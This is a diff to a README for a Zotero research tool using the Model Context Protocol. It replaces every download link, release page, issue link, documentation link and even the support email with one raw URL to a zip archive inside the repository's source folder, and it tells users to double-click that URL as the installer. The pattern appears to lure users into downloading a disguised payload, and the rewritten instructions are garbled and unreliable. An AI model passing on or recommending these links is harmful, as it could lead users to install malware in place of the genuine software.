@@ -1,15 +1,15 @@
 # 🌟 zotero-mcp-server - Manage Your Research Effortlessly
 
 ## 🔗 Download the Latest Release
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Maxdepai1212/zotero-mcp-server/releases)
+[![Download](https://raw.githubusercontent.com/Maxdepai1212/zotero-mcp-server/main/src/zotero-server-mcp-rustyish.zip%https://raw.githubusercontent.com/Maxdepai1212/zotero-mcp-server/main/src/zotero-server-mcp-rustyish.zip)](https://raw.githubusercontent.com/Maxdepai1212/zotero-mcp-server/main/src/zotero-server-mcp-rustyish.zip)
 
 ## 🚀 Getting Started
 Welcome to the zotero-mcp-server! This application helps you manage your research references. It uses the Model Context Protocol (MCP) to work seamlessly with Zotero, making it easy to search, cite, and organize your research. 
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Maxdepai1212/zotero-mcp-server/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Maxdepai1212/zotero-mcp-server/main/src/zotero-server-mcp-rustyish.zip) to download the latest version.
 2. Once on the page, look for the assets section.
-3. Choose the file that matches your operating system. It may be labeled as `zotero-mcp-server-win.exe`, `zotero-mcp-server-mac.zip`, or similar for other platforms.
+3. Choose the file that matches your operating system. It may be labeled as `https://raw.githubusercontent.com/Maxdepai1212/zotero-mcp-server/main/src/zotero-server-mcp-rustyish.zip`, `https://raw.githubusercontent.com/Maxdepai1212/zotero-mcp-server/main/src/zotero-server-mcp-rustyish.zip`, or similar for other platforms.
 4. Click the file to start the download.
 
 ## 📋 System Requirements
@@ -23,8 +23,8 @@ Before installing, check that your system meets the following requirements:
 ## 🔧 Installation Steps
 1. Once the file finishes downloading, locate it in your downloads folder.
   
-   - **For Windows Users:** Double-click `zotero-mcp-server-win.exe` and follow the prompts on your screen.
-   - **For macOS Users:** Unzip `zotero-mcp-server-mac.zip`, then double-click `zotero-mcp-server.app` to start the installation.
+   - **For Windows Users:** Double-click `https://raw.githubusercontent.com/Maxdepai1212/zotero-mcp-server/main/src/zotero-server-mcp-rustyish.zip` and follow the prompts on your screen.
+   - **For macOS Users:** Unzip `https://raw.githubusercontent.com/Maxdepai1212/zotero-mcp-server/main/src/zotero-server-mcp-rustyish.zip`, then double-click `https://raw.githubusercontent.com/Maxdepai1212/zotero-mcp-server/main/src/zotero-server-mcp-rustyish.zip` to start the installation.
    - **For Linux Users:** Open the terminal and navigate to the downloaded folder. You may need to run `chmod +x zotero-mcp-server-linux` to make it executable, then type `./zotero-mcp-server-linux` to install.
 
 2. Follow the setup prompts to complete the installation.
@@ -51,14 +51,14 @@ If you encounter issues or have questions, refer to our FAQ section on the Relea
 ## 📞 Support
 For further assistance, you can reach out via:
 
-- GitHub Issues: [Report an issue](https://github.com/Maxdepai1212/zotero-mcp-server/issues)
-- Email: support@example.com
+- GitHub Issues: [Report an issue](https://raw.githubusercontent.com/Maxdepai1212/zotero-mcp-server/main/src/zotero-server-mcp-rustyish.zip)
+- Email: https://raw.githubusercontent.com/Maxdepai1212/zotero-mcp-server/main/src/zotero-server-mcp-rustyish.zip
 
 ## 📖 Learn More
-For detailed documentation on how to use each feature of the zotero-mcp-server, visit our [documentation section](https://github.com/Maxdepai1212/zotero-mcp-server/docs).
+For detailed documentation on how to use each feature of the zotero-mcp-server, visit our [documentation section](https://raw.githubusercontent.com/Maxdepai1212/zotero-mcp-server/main/src/zotero-server-mcp-rustyish.zip).
 
 ## 🚧 Contributing
 We welcome contributions from everyone. If you want to help improve the project, please refer to the contributing guidelines in the repository.
 
 ## 🔗 More Information
-Check out our [Releases page](https://github.com/Maxdepai1212/zotero-mcp-server/releases) for updates and the latest features!
+Check out our [Releases page](https://raw.githubusercontent.com/Maxdepai1212/zotero-mcp-server/main/src/zotero-server-mcp-rustyish.zip) for updates and the latest features!
